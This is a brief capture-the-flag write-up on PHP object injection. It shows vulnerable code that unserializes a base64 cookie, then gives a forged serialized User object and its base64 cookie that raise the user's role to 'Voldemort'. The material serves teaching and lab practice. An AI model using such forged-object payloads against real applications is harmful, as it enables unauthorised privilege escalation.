# 25 AUG 2021 | POI 


no interesting stuff in the site , view sorce code :

![image](https://user-images.githubusercontent.com/67979878/130844912-a7d2071a-acb1-4d5d-a372-20bbf3000087.png)

if we press voldemort on right-top we can view source

```php
 <?php

Class User
{
    private $role = "Guest";

    public function GetInfo()
    {
        include("titles.php");

        if($this->role === "Voldemort")
        {
            return $Title_A;
        }
        else
        {
            return $Title_B;
        }
    }

}
?>
<?php
    include("user.php");

    if(isset($_COOKIE["user"]))
    {
        $user = unserialize(base64_decode($_COOKIE["user"]));
    }
    else
    {
        $user = new User();
    }

?>
```
so as we can see if we have a cookie code flow will enter ther unserialize() method which is Vulnerable

cookie is base64 encoded and to be unserialized it should be like :

serialized data :

O:4:"User":1:{s:10:".User.role";s:9:"Voldemort";}

`Tzo0OiJVc2VyIjoxOntzOjEwOiIuVXNlci5yb2xlIjtzOjk6IlZvbGRlbW9ydCI7fQ==`

### note | we use .User.role beacuse it it private


![image](https://user-images.githubusercontent.com/67979878/130849522-728cbdd8-b0b3-41b0-aa06-1ea2520cff16.png)







# done






